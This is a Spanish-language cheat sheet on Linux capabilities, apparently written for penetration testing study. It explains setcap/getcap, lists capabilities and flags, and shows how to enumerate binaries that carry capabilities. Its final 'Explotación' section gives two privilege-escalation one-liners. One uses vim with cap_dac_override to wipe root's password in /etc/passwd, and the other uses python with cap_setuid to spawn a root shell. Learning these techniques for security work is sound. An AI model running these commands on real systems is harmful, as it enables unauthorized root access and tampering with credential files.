---
title: Capabilities
tags: [linux, capabilities]
lang: es
parent: linux-es
draft: false
---

> Característica de seguridad que asigna privilegios específicos a procesos individuales en lugar de otorgar acceso total de usuario o grupo.

- `setcap`: Comando utilizado en Linux para asignar capabilities y sus valores específicos a archivos ejecutables.
- `getcap`: Comando empleado para listar las capabilities configuradas en un binario ejecutable.

| Capability           | Descripción                                                                                                                     |
| -------------------- | ------------------------------------------------------------------------------------------------------------------------------- |
| cap_sys_admin        | Permite acciones de administración global como modificar archivos del sistema, configuraciones o montar sistemas de archivos    |
| cap_sys_chroot       | Permite cambiar el directorio raíz (chroot) del proceso actual para acceder a archivos e infraestructuras restringidas          |
| cap_sys_ptrace       | Permite acoplarse y depurar otros procesos en ejecución, posibilitando la inspección de datos o alteración de su comportamiento |
| cap_sys_nice         | Permite modificar la prioridad de ejecución de los procesos del sistema                                                         |
| cap_sys_time         | Permite modificar el reloj del sistema, alterando marcas de tiempo o el comportamiento de procesos dependientes del tiempo      |
| cap_sys_resource     | Permite evadir y modificar los límites de recursos del sistema (ej. descriptores de archivos abiertos o memoria máxima)         |
| cap_sys_module       | Permite cargar y descargar módulos directamente en el kernel del sistema operativo                                              |
| cap_net_bind_service | Permite enlazar (bind) sockets y servicios a puertos de red restringidos (inferiores al puerto 1024)                            |

## Flags y valores de configuración

- `=` (Vacío): Remueve los privilegios asociados y limpia cualquier configuración previa de la capability en el ejecutable.
- `+ep` (Effective Permitted): Otorga permisos permitidos (permitted) que el binario puede activar de forma efectiva (effective) para ejecutar la acción.
- `+ei` (Effective Inheritable): Otorga permisos que se transfieren de forma heredable (inheritable) a los procesos hijos iniciados por el ejecutable.
- `+p` (Permitted): Otorga la capability únicamente en el set permitido del ejecutable, impidiendo su herencia hacia procesos secundarios.

| Capability crítica | Impacto en seguridad                                                                                                                 |
| ------------------ | ------------------------------------------------------------------------------------------------------------------------------------ |
| cap_setuid         | Permite a un proceso alterar su ID de usuario efectivo para adoptar la identidad de cualquier otro usuario, incluido root            |
| cap_setgid         | Permite modificar el ID de grupo efectivo del proceso para adquirir privilegios de otros grupos del sistema                          |
| cap_dac_override   | Permite omitir las verificaciones de permisos del sistema de archivos para lectura, escritura y ejecución de cualquier archivo local |

## Asignación

```bash
sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

## Enumeración

```bash
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

```bash
getcap -r / 2>/dev/null
```

## Explotación

Explotación con `cap_dac_override` (Modificación no interactiva de archivos protegidos)

```bash
echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
```

Explotación de `cap_setuid`

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```
